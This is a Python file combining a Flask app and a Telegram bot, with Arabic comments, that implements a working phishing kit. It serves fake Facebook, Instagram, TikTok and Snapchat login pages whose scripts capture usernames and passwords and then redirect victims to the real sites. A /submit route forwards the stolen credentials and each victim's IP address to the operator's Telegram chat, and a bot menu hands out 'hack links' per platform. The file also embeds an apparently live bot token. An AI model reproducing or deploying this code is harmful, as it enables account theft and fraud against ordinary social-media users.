import os
import threading
import telebot
import logging
from flask import Flask, request, render_template_string, redirect
from telebot import types

# --- الإعدادات الأساسية ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = 6829017835
OWNER = "KING-SAQR"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- قوالب الصفحات (تم تنظيفها من الكاميرا والموقع) ---

PAGES = {
    "facebook": """<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>فيسبوك - تسجيل الدخول</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.container{max-width:400px;width:100%;background:white;border-radius:28px;box-shadow:0 8px 28px rgba(0,0,0,0.1),0 0 0 1px rgba(0,0,0,0.02);padding:40px 24px;text-align:center;}.logo{font-size:48px;font-weight:700;color:#1877f2;margin-bottom:24px;}.input-field{width:100%;padding:14px 16px;margin:10px 0;border:1px solid #dddfe2;border-radius:12px;font-size:17px;background:#fff;transition:0.1s;}.input-field:focus{border-color:#1877f2;outline:none;box-shadow:0 0 0 2px #e7f3ff;}.login-btn{width:100%;background:#1877f2;border:none;border-radius:12px;padding:14px;font-size:18px;font-weight:600;color:white;margin-top:14px;cursor:pointer;transition:0.2s;}.links{display:flex;justify-content:space-between;margin-top:20px;font-size:14px;}.links a{color:#1877f2;text-decoration:none;}.divider{height:1px;background:#dadde1;margin:24px 0;}.new-account{background:#42b72a;border-radius:12px;padding:12px;font-weight:600;color:white;text-decoration:none;display:inline-block;width:100%;text-align:center;}</style></head><body><div class="container"><div class="logo">f</div><form id="loginForm"><input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required><input type="password" class="input-field" id="password" placeholder="كلمة المرور" required><button type="submit" class="login-btn">تسجيل الدخول</button><div class="links"><a href="#">نسيت كلمة المرور؟</a><a href="#">إنشاء حساب جديد</a></div><div class="divider"></div><a href="#" class="new-account">إنشاء حساب على فيسبوك</a></form></div><script>document.getElementById("loginForm").addEventListener("submit",function(e){e.preventDefault();fetch("/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:document.getElementById("email").value,p:document.getElementById("password").value,platform:"Facebook"})}).finally(()=>{window.location.href="https://facebook.com";});});</script></body></html>""",
    
    "instagram": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>Instagram • Login</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px;}.container{max-width:350px;width:100%;background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 28px;text-align:center;}.logo{font-size:52px;margin-bottom:32px;color:#262626;}.input-field{width:100%;padding:12px 12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:6px;background:#fafafa;font-size:14px;}.login-btn{width:100%;background:#0095f6;border:none;border-radius:8px;padding:10px;font-size:15px;font-weight:600;color:white;margin-top:12px;cursor:pointer;}.separator{display:flex;margin:20px 0;align-items:center;font-size:13px;color:#8e8e8f;}.separator::before,.separator::after{content:"";flex:1;height:1px;background:#dbdbdb;margin:0 12px;}.fb-login{color:#385185;font-weight:600;font-size:14px;text-decoration:none;}</style></head><body><div class="container"><div class="logo">Instagram</div><form id="loginForm"><input type="text" class="input-field" id="username" placeholder="اسم المستخدم" required><input type="password" class="input-field" id="password" placeholder="كلمة المرور" required><button type="submit" class="login-btn">تسجيل الدخول</button><div class="separator"><span>أو</span></div><a href="#" class="fb-login">تسجيل الدخول باستخدام Facebook</a></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('username').value,p:document.getElementById('password').value,platform:'Instagram'})}).finally(()=>{window.location.href='https://instagram.com';});});</script></body></html>""",
    
    "tiktok": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>TikTok - تسجيل الدخول</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif;}body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.card{max-width:380px;width:100%;background:white;border-radius:40px;box-shadow:0 8px 28px rgba(0,0,0,0.08);padding:36px 28px;text-align:center;}.logo{font-weight:800;font-size:38px;color:#000;margin-bottom:20px;}.input-group input{width:100%;padding:16px 20px;margin:10px 0;border:1px solid #e1e1e2;border-radius:36px;font-size:16px;background:#f8f8f8;}.login-btn{width:100%;background:#fe2c55;border:none;border-radius:44px;padding:14px;font-size:18px;font-weight:700;color:white;margin-top:18px;cursor:pointer;}</style></head><body><div class="card"><div class="logo">TikTok</div><form id="loginForm"><div class="input-group"><input type="text" id="emailPhone" placeholder="الإيميل / الهاتف" required></div><div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div><button type="submit" class="login-btn">تسجيل الدخول</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',(e)=>{e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('emailPhone').value,p:document.getElementById('password').value,platform:'TikTok'})}).finally(()=>{window.location.href='https://tiktok.com';});});</script></body></html>""",
    
    "snapchat": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes"><title>Snapchat • Log in</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}body{background:#FFFC00;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:24px;}.ghost{background:white;border-radius:48px;width:100%;max-width:380px;padding:36px 28px;box-shadow:0 12px 28px rgba(0,0,0,0.12);text-align:center;}.ghost-logo{font-size:56px;font-weight:800;color:#000;margin-bottom:24px;}.input-snap{width:100%;padding:16px 18px;margin:10px 0;border:1px solid #ddd;border-radius:60px;font-size:17px;background:#fafafa;}.snap-btn{background:#000;border:none;border-radius:60px;padding:16px;width:100%;font-size:18px;font-weight:600;color:#FFFC00;margin-top:14px;cursor:pointer;}</style></head><body><div class="ghost"><div class="ghost-logo">👻</div><form id="loginForm"><input type="text" class="input-snap" id="username" placeholder="اسم المستخدم" required><input type="password" class="input-snap" id="password" placeholder="كلمة المرور" required><button type="submit" class="snap-btn">تسجيل الدخول</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',(e)=>{e.preventDefault();fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('username').value,p:document.getElementById('password').value,platform:'Snapchat'})}).finally(()=>{window.location.replace('https://accounts.snapchat.com');});});</script></body></html>"""
}

# --- لوحة التحكم تليجرام ---
def get_main_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📘 فيسبوك", callback_data="link_facebook"),
        types.InlineKeyboardButton("📸 إنستغرام", callback_data="link_instagram")
    )
    kb.add(
        types.InlineKeyboardButton("🎵 تيك توك", callback_data="link_tiktok"),
        types.InlineKeyboardButton("👻 سناب شات", callback_data="link_snapchat")
    )
    return kb

@app.route('/')
def home():
    t = request.args.get('type', 'facebook')
    return render_template_string(PAGES.get(t, PAGES['facebook']))

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    msg = f"🚨 *سحب حساب جديد ({data['platform']}):*\n👤: `{data['u']}`\n🔑: `{data['p']}`\n🌍 IP: `{request.remote_addr}`"
    bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    return "ok"

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id == ADMIN_ID:
        bot.send_message(m.chat.id, f"🎖️ أهلاً جنرال {OWNER}\nاختر المنصة لإنشاء الرابط:", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
def send_link(c):
    platform = c.data.split("_")[1]
    host = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')
    url = f"https://{host}/?type={platform}"
    bot.send_message(c.message.chat.id, f"🔗 رابط اختراق {platform}:\n`{url}`", parse_mode='Markdown')

threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
